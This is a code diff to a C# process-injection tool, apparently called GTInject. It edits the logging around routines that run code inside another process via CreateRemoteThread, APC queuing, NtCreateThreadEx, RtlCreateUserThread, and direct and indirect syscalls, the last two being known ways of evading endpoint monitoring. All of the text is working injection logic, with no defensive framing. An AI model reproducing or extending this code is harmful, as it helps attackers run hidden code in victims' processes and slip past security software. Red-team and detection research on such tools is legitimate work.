@@ -48,7 +48,11 @@ namespace GTInject.Injection
 
             Console.WriteLine("     Execute code using WINAPIs CreateRemoteThread");
             IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
-            Console.WriteLine("     Called CreateRemoteThread with response : " + remoteThreadResp);
+            if (remoteThreadResp != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] WinAPI CreateRemoteThread with response : " + remoteThreadResp);
+
+            }
             return remoteThreadResp;
         }
 
@@ -73,6 +77,8 @@ namespace GTInject.Injection
             }
             else
             {
+                Console.WriteLine("[+] WinAPI QueueUserAPC called");
+
                 var threadObjects = ProcID.Threads;
                 for (int i = 0; i < threadObjects.Count; i++)
                 {
@@ -84,6 +90,10 @@ namespace GTInject.Injection
                         {
                             Console.WriteLine("     resume Thread failed");
                             return IntPtr.Zero;
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] WinAPI ResumeThread called");
                         }
                     }
                 }
@@ -107,7 +117,7 @@ namespace GTInject.Injection
 
             IntPtr hRemoteThread;
             uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("    Called NtCreateThreadEx with response : " + hThread);
+            Console.WriteLine("[+] NTAPI NtCreateThreadEx with response : " + hThread);
 
             return hRemoteThread;
         }
@@ -123,7 +133,7 @@ namespace GTInject.Injection
             int hthread = RtlCreateUserThread(ProcID.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memaddr, IntPtr.Zero, ref targetThread, ref id);
             if (hthread == 0)
             {
-                Console.WriteLine("     RtlCreateUserThread resp : " + hthread);
+                Console.WriteLine("[+] NTAPI RtlCreateUserThread resp : " + hthread);
                 return targetThread;
             }
             else
@@ -163,6 +173,7 @@ namespace GTInject.Injection
             }
             else
             {
+                Console.WriteLine("[+] NTAPI NtQueueApcThread called");
                 var threadObjects = ProcID.Threads;
                 for (int i = 0; i < threadObjects.Count; i++)
                 {
@@ -177,7 +188,7 @@ namespace GTInject.Injection
                         }
                     }
                 }
-                Console.WriteLine("     NTAPI for NtQueueApcThread executed");
+                Console.WriteLine("[+] NTAPI NtQueueApcThread called");
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
         }
@@ -191,14 +202,16 @@ namespace GTInject.Injection
             var hProcess = ProcID.Handle;
             IntPtr hThread = IntPtr.Zero;
             var status = Syscalls.SysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("     Direct Syscall to CreateThread " + status);
 
             if (status == WinNative.NTSTATUS.Success)
             {
+                Console.WriteLine("[+] Direct Syscall to NtCreateThreadEx " + status);
                 return memaddr;
             }
             else
             {
+                Console.WriteLine("[-] Direct Syscall to NtCreateThreadEx " + status);
+
                 return IntPtr.Zero;
             }
 
@@ -226,6 +239,7 @@ namespace GTInject.Injection
             }
             else
             {
+                Console.WriteLine("[+] Direct Syscall NtQueueApcThread called");
                 var threadObjects = ProcID.Threads;
                 for (int i = 0; i < threadObjects.Count; i++)
                 {
@@ -238,22 +252,13 @@ namespace GTInject.Injection
                             Console.WriteLine("     Direct Syscall NtResumeThread failed");
                             return IntPtr.Zero;
                         }
+                        else
+                        {
+                            Console.WriteLine("[+] Direct Syscall NtResumeThread called");
+                        }
                     }
                 }
-                Console.WriteLine("     Direct Syscall for NtQueueApcThread executed");
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
-            }
-
-            // set up the syscall for NtQueueApcThread
-
-
-            if (status == WinNative.NTSTATUS.Success)
-            {
-                return memaddr;
-            }
-            else
-            {
-                return IntPtr.Zero;
             }
 
         }
@@ -268,10 +273,11 @@ namespace GTInject.Injection
             var hProcess = ProcID.Handle;
             IntPtr hThread = IntPtr.Zero;
             var status = Syscalls.IndirectSysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-            Console.WriteLine("     Indirect Syscall to CreateThread " + status);
 
             if (status == WinNative.NTSTATUS.Success)
             {
+                Console.WriteLine("[+] Indirect Syscall to CreateThread " + status);
+
                 return memaddr;
             }
             else
